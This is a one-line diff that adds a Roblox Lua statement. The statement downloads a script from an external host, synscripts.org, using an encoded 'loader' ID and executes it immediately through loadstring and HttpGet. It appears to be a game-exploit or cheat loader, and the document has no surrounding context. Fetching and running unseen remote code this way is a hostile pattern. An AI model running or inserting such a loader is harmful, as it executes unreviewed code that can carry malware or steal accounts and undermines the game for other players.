@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.synscripts.org/run/eyJpZCI6IjI3MWRmNDgzLThlYTktNDI5ZS1iY2NiLTZmYmQyZTkwMTFmNyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0="))()
